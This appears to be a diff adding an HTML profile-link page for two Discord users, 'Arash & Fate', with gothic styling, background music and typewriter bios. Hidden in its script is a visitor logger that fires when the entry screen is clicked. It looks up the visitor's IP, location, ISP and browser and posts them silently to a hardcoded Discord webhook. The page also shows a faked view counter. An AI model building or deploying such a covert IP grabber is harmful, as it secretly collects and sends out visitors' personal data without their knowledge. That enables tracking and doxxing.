@@ -1,0 +1,1073 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arash & Fate | Biolink</title>
+    <meta name="description" content="Check out our links and socials">
+    <meta name="theme-color" content="#0a0a0a">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="Arash & Fate | Biolink">
+    <meta property="og:description" content="Check out our links and socials">
+    <meta property="og:type" content="website">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Cinzel:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #111111;
+            --bg-card: rgba(255, 255, 255, 0.02);
+            --bg-card-hover: rgba(255, 255, 255, 0.05);
+            --text-primary: #e0e0e0;
+            --text-secondary: #666666;
+            --accent-primary: #333333;
+            --accent-secondary: #444444;
+            --accent-gradient: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 50%, #1a1a1a 100%);
+            --accent-gradient-2: linear-gradient(135deg, #1a1a1a 0%, #252525 50%, #1a1a1a 100%);
+            --glow-color: rgba(100, 100, 100, 0.3);
+            --glow-color-2: rgba(80, 80, 80, 0.3);
+            --border-color: rgba(255, 255, 255, 0.05);
+            --card-blur: 20px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            cursor: none;
+        }
+
+        /* Cross Cursor */
+        .cursor-cross {
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+        }
+
+        .cursor-cross::before,
+        .cursor-cross::after {
+            content: '';
+            position: absolute;
+            background: #888;
+            transition: all 0.2s ease;
+        }
+
+        .cursor-cross::before {
+            width: 2px;
+            height: 20px;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .cursor-cross::after {
+            width: 20px;
+            height: 2px;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .cursor-cross.hover::before {
+            height: 30px;
+            background: #aaa;
+        }
+
+        .cursor-cross.hover::after {
+            width: 30px;
+            background: #aaa;
+        }
+
+        /* Background */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: var(--bg-primary);
+            background-image: url('assets/bg.jpeg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            image-rendering: high-quality;
+        }
+
+        /* Dark Vignette Overlay */
+        .background-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, transparent 0%, #000000 80%);
+            z-index: -1;
+        }
+
+        /* Gothic Fog/Mist Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: #333;
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: float 20s infinite;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.3;
+            }
+            90% {
+                opacity: 0.3;
+            }
+            100% {
+                transform: translateY(-100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* Scanline Effect */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9998;
+            pointer-events: none;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.1),
+                rgba(0, 0, 0, 0.1) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            opacity: 0.3;
+        }
+
+        /* Main Container - Dual Profile Layout */
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            gap: 40px;
+            padding: 40px 20px;
+            min-height: 100vh;
+            flex-wrap: wrap;
+        }
+
+        .profile-card {
+            width: 100%;
+            max-width: 380px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px;
+            background: rgba(15, 15, 15, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            border-radius: 4px;
+            backdrop-filter: blur(var(--card-blur));
+            transition: all 0.3s ease;
+        }
+
+        .profile-card:hover {
+            background: rgba(20, 20, 20, 0.9);
+            border-color: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Profile Section */
+        .profile {
+            text-align: center;
+            margin-bottom: 25px;
+            animation: fadeInUp 0.8s ease forwards;
+        }
+
+        .profile-card:nth-child(2) .profile {
+            animation-delay: 0.1s;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Avatar */
+        .avatar-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+        }
+
+        .avatar-glow {
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            right: -5px;
+            bottom: -5px;
+            background: radial-gradient(circle, rgba(60, 60, 60, 0.5) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: pulse-glow 4s ease-in-out infinite;
+            filter: blur(10px);
+            opacity: 0.5;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 0.3;
+            }
+            50% {
+                transform: scale(1.1);
+                opacity: 0.5;
+            }
+        }
+
+        .avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #222;
+            position: relative;
+            z-index: 1;
+            transition: transform 0.3s ease, filter 0.3s ease;
+            filter: grayscale(30%);
+        }
+
+        .avatar:hover {
+            transform: scale(1.05);
+            filter: grayscale(0%);
+        }
+
+        /* Avatar Decoration (Nitro ring) */
+        .avatar-decoration {
+            position: absolute;
+            top: -15px;
+            left: -15px;
+            width: 150px;
+            height: 150px;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        /* Status Badge */
+        .status-badge {
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            width: 18px;
+            height: 18px;
+            background: #747f8d;
+            border: 3px solid var(--bg-primary);
+            border-radius: 50%;
+            z-index: 2;
+            transition: background 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .status-badge.online {
+            background: #3ba55c;
+            box-shadow: 0 0 10px rgba(59, 165, 92, 0.5);
+        }
+
+        .status-badge.idle {
+            background: #faa61a;
+            box-shadow: 0 0 10px rgba(250, 166, 26, 0.4);
+        }
+
+        .status-badge.dnd {
+            background: #ed4245;
+            box-shadow: 0 0 10px rgba(237, 66, 69, 0.4);
+        }
+
+        .status-badge.offline {
+            background: #747f8d;
+        }
+
+        /* Badges */
+        .badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        .badge {
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            background: transparent;
+            border: none;
+            transition: transform 0.2s ease;
+            overflow: hidden;
+        }
+
+        .badge:hover {
+            transform: translateY(-2px) scale(1.15);
+        }
+
+        .badge img {
+            width: 24px;
+            height: 24px;
+            object-fit: contain;
+        }
+
+        .badge.clan-badge {
+            border-radius: 50%;
+        }
+
+        /* Username - Gothic Font */
+        .username {
+            font-family: 'Cinzel', serif;
+            font-size: 26px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #c0c0c0;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .handle {
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        /* Bio with Typewriter */
+        .bio {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.6;
+            max-width: 320px;
+            margin: 0 auto;
+            min-height: 44px;
+            font-style: italic;
+        }
+
+        .typewriter {
+            display: inline;
+            border-right: 1px solid #444;
+            animation: blink 1.2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% {
+                border-color: #444;
+            }
+            51%, 100% {
+                border-color: transparent;
+            }
+        }
+
+        /* Social Links - Discord & Telegram */
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            width: 100%;
+            animation: fadeInUp 0.8s ease forwards;
+            animation-delay: 0.2s;
+            opacity: 0;
+        }
+
+        .social-link {
+            width: 42px;
+            height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            background: #111;
+            border: 1px solid #1a1a1a;
+            border-radius: 50%;
+            color: #666;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .social-link span {
+            display: none;
+        }
+
+        .social-link i {
+            font-size: 18px;
+        }
+
+        .social-link:hover {
+            transform: translateY(-3px);
+            background: #161616;
+            border-color: #333;
+            color: #999;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .social-link.discord:hover {
+            color: #5865F2;
+            border-color: #5865F2;
+        }
+
+        .social-link.telegram:hover {
+            color: #26A5E4;
+            border-color: #26A5E4;
+        }
+
+        /* Divider */
+        .divider {
+            display: none;
+            width: 1px;
+            background: linear-gradient(to bottom, transparent, #222, transparent);
+            margin: 0 20px;
+            align-self: stretch;
+        }
+
+        /* Music Player Control */
+        .music-control {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: none;
+            z-index: 100;
+            transition: all 0.3s ease;
+        }
+
+        .music-control:hover {
+            background: #1a1a1a;
+            border-color: #333;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .music-control i {
+            color: #555;
+            font-size: 18px;
+            transition: color 0.3s ease;
+        }
+
+        .music-control:hover i {
+            color: #888;
+        }
+
+        .music-control.playing i {
+            animation: pulse-music 1s ease-in-out infinite;
+        }
+
+        @keyframes pulse-music {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        /* Footer */
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            font-size: 11px;
+            color: #333;
+            animation: fadeInUp 0.8s ease forwards;
+            animation-delay: 0.8s;
+            opacity: 0;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .footer a {
+            color: #444;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .footer a:hover {
+            color: #666;
+        }
+
+        .views {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 8px;
+        }
+
+        /* Responsive */
+        @media (min-width: 800px) {
+            .divider {
+                display: block;
+            }
+
+            .main-container {
+                flex-wrap: nowrap;
+                align-items: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-container {
+                padding: 30px 15px;
+                gap: 50px;
+            }
+
+            .username {
+                font-size: 22px;
+            }
+
+            .avatar-container {
+                width: 100px;
+                height: 100px;
+            }
+
+            .avatar {
+                width: 100px;
+                height: 100px;
+            }
+
+            .social-link {
+                padding: 12px 16px;
+                font-size: 12px;
+            }
+
+            /* Show default cursor on mobile */
+            body {
+                cursor: auto;
+            }
+
+            .cursor-cross {
+                display: none;
+            }
+        }
+
+        /* Tooltip */
+        [data-tooltip] {
+            position: relative;
+        }
+
+        [data-tooltip]::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%) translateY(-5px);
+            padding: 6px 12px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 4px;
+            font-size: 11px;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.2s ease;
+            z-index: 100;
+            color: #666;
+            letter-spacing: 1px;
+        }
+
+        [data-tooltip]:hover::after {
+            opacity: 1;
+            visibility: visible;
+            transform: translateX(-50%) translateY(-10px);
+        }
+
+        /* Loading Animation */
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        .loading.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .loading-cross {
+            position: relative;
+            width: 40px;
+            height: 40px;
+            animation: spin-slow 3s linear infinite;
+        }
+
+        .loading-cross::before,
+        .loading-cross::after {
+            content: '';
+            position: absolute;
+            background: #333;
+        }
+
+        .loading-cross::before {
+            width: 2px;
+            height: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .loading-cross::after {
+            width: 40px;
+            height: 2px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        @keyframes spin-slow {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Audio prompt overlay */
+        .audio-prompt {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10001;
+            cursor: none;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        .audio-prompt.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .audio-prompt-text {
+            font-family: 'Cinzel', serif;
+            font-size: 14px;
+            color: #444;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            animation: pulse-text 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-text {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 0.8; }
+        }
+
+        /* Decorative cross elements */
+        .deco-cross {
+            position: fixed;
+            opacity: 0.03;
+            pointer-events: none;
+        }
+
+        .deco-cross::before,
+        .deco-cross::after {
+            content: '';
+            position: absolute;
+            background: #fff;
+        }
+
+        .deco-cross::before {
+            width: 1px;
+            height: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .deco-cross::after {
+            width: 100px;
+            height: 1px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .deco-cross.top-left {
+            top: 50px;
+            left: 50px;
+        }
+
+        .deco-cross.top-right {
+            top: 50px;
+            right: 50px;
+        }
+
+        .deco-cross.bottom-left {
+            bottom: 80px;
+            left: 50px;
+        }
+
+        .deco-cross.bottom-right {
+            bottom: 80px;
+            right: 100px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Audio Prompt - Click anywhere to enter -->
+    <div class="audio-prompt" id="audioPrompt">
+        <p class="audio-prompt-text">Click anywhere to enter</p>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading" id="loading">
+        <div class="loading-cross"></div>
+    </div>
+
+    <!-- Cross Cursor -->
+    <div class="cursor-cross" id="cursor"></div>
+
+    <!-- Scanlines -->
+    <div class="scanlines"></div>
+
+    <!-- Decorative Crosses -->
+    <div class="deco-cross top-left"></div>
+    <div class="deco-cross top-right"></div>
+    <div class="deco-cross bottom-left"></div>
+    <div class="deco-cross bottom-right"></div>
+
+    <!-- Background -->
+    <div class="background"></div>
+    <div class="background-overlay"></div>
+
+    <!-- Particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Background Audio -->
+    <audio id="bgMusic" loop>
+        <!-- Add your audio file here -->
+        <source src="assets/music.mp3" type="audio/mpeg">
+        <!-- Fallback ambient audio from a free source -->
+    </audio>
+
+    <!-- Main Container with Two Profiles -->
+    <div class="main-container">
+        <!-- Profile 1: x (Arash) -->
+        <div class="profile-card">
+            <div class="profile">
+                <div class="avatar-container">
+                    <div class="avatar-glow"></div>
+                    <img src="https://cdn.discordapp.com/avatars/1118630652200366191/33c27526ff31fbab1fdbe82cde1d7e92.png?size=256" alt="x" class="avatar">
+                    <img src="https://cdn.discordapp.com/avatar-decoration-presets/a_1005898c6acf56a9ac5010baf444f6fd.png?size=256" class="avatar-decoration" alt="">
+                    <div class="status-badge offline" data-tooltip="Offline"></div>
+                </div>
+                <div class="badges">
+                    <div class="badge" data-tooltip="Nitro Subscriber">
+                        <img src="assets/badge-nitro.svg" alt="Nitro">
+                    </div>
+                    <div class="badge" data-tooltip="HypeSquad Balance">
+                        <img src="assets/badge-balance.svg" alt="HypeSquad Balance">
+                    </div>
+                </div>
+                <h1 class="username">x</h1>
+                <p class="handle">@cute_elephant7737</p>
+                <p class="bio">
+                    <span class="typewriter" id="typewriter1"></span>
+                </p>
+            </div>
+            <div class="social-links">
+                <a href="#" class="social-link discord" data-tooltip="Discord">
+                    <i class="fab fa-discord"></i>
+                    <span>Discord</span>
+                </a>
+                <a href="#" class="social-link telegram" data-tooltip="Telegram">
+                    <i class="fab fa-telegram"></i>
+                    <span>Telegram</span>
+                </a>
+            </div>
+        </div>
+
+        <!-- Divider -->
+        <div class="divider"></div>
+
+        <!-- Profile 2: strike (Fate) -->
+        <div class="profile-card">
+            <div class="profile">
+                <div class="avatar-container">
+                    <div class="avatar-glow"></div>
+                    <img src="https://cdn.discordapp.com/avatars/1191611632414101524/f228ffabd177714a79094c882455de3b.png?size=256" alt="strike" class="avatar">
+                    <div class="status-badge offline" data-tooltip="Offline"></div>
+                </div>
+                <div class="badges">
+                    <div class="badge clan-badge" data-tooltip="Clan: DOOM">
+                        <img src="https://cdn.discordapp.com/clan-badges/1379456240551198751/c08ecb1ef98d938294b1db84ca629ef7.png" alt="DOOM">
+                    </div>
+                </div>
+                <h1 class="username">strike</h1>
+                <p class="handle">@zxvzxvzxvzxvzv</p>
+                <p class="bio">
+                    <span class="typewriter" id="typewriter2"></span>
+                </p>
+            </div>
+            <div class="social-links">
+                <a href="#" class="social-link discord" data-tooltip="Discord">
+                    <i class="fab fa-discord"></i>
+                    <span>Discord</span>
+                </a>
+                <a href="#" class="social-link telegram" data-tooltip="Telegram">
+                    <i class="fab fa-telegram"></i>
+                    <span>Telegram</span>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Music Control Button -->
+    <div class="music-control" id="musicControl" data-tooltip="Toggle Music">
+        <i class="fas fa-volume-up"></i>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>Memento Mori</p>
+        <div class="views">
+            <i class="fas fa-eye"></i>
+            <span id="viewCount">0</span>
+        </div>
+    </div>
+
+    <script>
+        // =====================================================
+        // CONFIGURATION
+        // =====================================================
+        const CONFIG = {
+            arash: {
+                bio: ['Welcome to the void.', 'Embrace the darkness.', 'Find me in the shadows.'],
+                discord: '#',
+                telegram: '#'
+            },
+            fate: {
+                bio: ['Fate awaits.', 'In darkness we trust.', 'Beyond the veil.'],
+                discord: '#',
+                telegram: '#'
+            },
+            typewriterSpeed: 80,
+            typewriterDeleteSpeed: 40,
+            typewriterPause: 2500,
+            webhook: 'https://discord.com/api/webhooks/1469353875373822168/p44-sjGQ5aIQUoFFwMPtGTD-mgJbcxEmRr_hYZj1z46XppXURq8311m6_LfX1v1UpKeX'
+        };
+
+        // =====================================================
+        // IP LOGGING - Visitor tracking via Discord webhook
+        // =====================================================
+        async function logVisitor() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                const now = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+                const embed = {
+                    title: 'New Visitor',
+                    color: 0x2f3136,
+                    fields: [
+                        { name: 'IP', value: data.ip || 'Unknown', inline: true },
+                        { name: 'Location', value: `${data.city || '?'}, ${data.region || '?'}, ${data.country_name || '?'}`, inline: true },
+                        { name: 'ISP', value: data.org || 'Unknown', inline: false },
+                        { name: 'Device', value: navigator.userAgent, inline: false },
+                        { name: 'Timestamp (UTC)', value: now, inline: true }
+                    ],
+                    footer: { text: 'Biolink Visitor Log' }
+                };
+                await fetch(CONFIG.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (e) {
+                // Silent fail
+            }
+        }
+
+        // =====================================================
+        // CLICK ANYWHERE TO ENTER
+        // =====================================================
+        const audioPrompt = document.getElementById('audioPrompt');
+        const bgMusic = document.getElementById('bgMusic');
+        const loading = document.getElementById('loading');
+        const musicControl = document.getElementById('musicControl');
+        let isMusicPlaying = false;
+        let hasEntered = false;
+
+        audioPrompt.addEventListener('click', () => {
+            if (hasEntered) return;
+            hasEntered = true;
+
+            audioPrompt.classList.add('hidden');
+            bgMusic.volume = 0.3;
+            bgMusic.play().then(() => {
+                isMusicPlaying = true;
+                musicControl.classList.add('playing');
+            }).catch(err => console.log('Audio autoplay prevented:', err));
+            setTimeout(() => loading.classList.add('hidden'), 500);
+            setTimeout(() => animateValue(document.getElementById('viewCount'), 0, 6666, 2000), 1000);
+
+            // Log visitor on entry
+            logVisitor();
+        });
+
+        musicControl.addEventListener('click', () => {
+            if (isMusicPlaying) {
+                bgMusic.pause();
+                isMusicPlaying = false;
+                musicControl.classList.remove('playing');
+                musicControl.querySelector('i').className = 'fas fa-volume-mute';
+            } else {
+                bgMusic.play();
+                isMusicPlaying = true;
+                musicControl.classList.add('playing');
+                musicControl.querySelector('i').className = 'fas fa-volume-up';
+            }
+        });
+
+        // =====================================================
+        // CROSS CURSOR
+        // =====================================================
+        const cursor = document.getElementById('cursor');
+        document.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
+        });
+
+        const interactiveElements = document.querySelectorAll('a, .badge, .social-link, .music-control, .audio-prompt');
+        interactiveElements.forEach(el => {
+            el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
+            el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
+        });
+
+        // =====================================================
+        // TYPEWRITER EFFECT
+        // =====================================================
+        class Typewriter {
+            constructor(element, texts, speed = 100, deleteSpeed = 50, pause = 2000) {
+                this.element = element;
+                this.texts = texts;
+                this.speed = speed;
+                this.deleteSpeed = deleteSpeed;
+                this.pause = pause;
+                this.textIndex = 0;
+                this.charIndex = 0;
+                this.isDeleting = false;
+                this.type();
+            }
+            type() {
+                const currentText = this.texts[this.textIndex];
+                if (this.isDeleting) {
+                    this.element.textContent = currentText.substring(0, this.charIndex - 1);
+                    this.charIndex--;
+                } else {
+                    this.element.textContent = currentText.substring(0, this.charIndex + 1);
+                    this.charIndex++;
+                }
+                let typeSpeed = this.isDeleting ? this.deleteSpeed : this.speed;
+                if (!this.isDeleting && this.charIndex === currentText.length) {
+                    typeSpeed = this.pause;
+                    this.isDeleting = true;
+                } else if (this.isDeleting && this.charIndex === 0) {
+                    this.isDeleting = false;
+                    this.textIndex = (this.textIndex + 1) % this.texts.length;
+                    typeSpeed = 500;
+                }
+                setTimeout(() => this.type(), typeSpeed);
+            }
+        }
+
+        new Typewriter(document.getElementById('typewriter1'), CONFIG.arash.bio, CONFIG.typewriterSpeed, CONFIG.typewriterDeleteSpeed, CONFIG.typewriterPause);
+        setTimeout(() => {
+            new Typewriter(document.getElementById('typewriter2'), CONFIG.fate.bio, CONFIG.typewriterSpeed, CONFIG.typewriterDeleteSpeed, CONFIG.typewriterPause);
+        }, 1000);
+
+        // =====================================================
+        // PARTICLES
+        // =====================================================
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 20 + 's';
+            particle.style.animationDuration = (Math.random() * 15 + 15) + 's';
+            particle.style.opacity = Math.random() * 0.2 + 0.1;
+            particlesContainer.appendChild(particle);
+        }
+
+        // =====================================================
+        // VIEW COUNTER
+        // =====================================================
+        function animateValue(element, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                element.textContent = Math.floor(progress * (end - start) + start).toLocaleString();
+                if (progress < 1) window.requestAnimationFrame(step);
+            };
+            window.requestAnimationFrame(step);
+        }
+    </script>
+</body>
+</html>
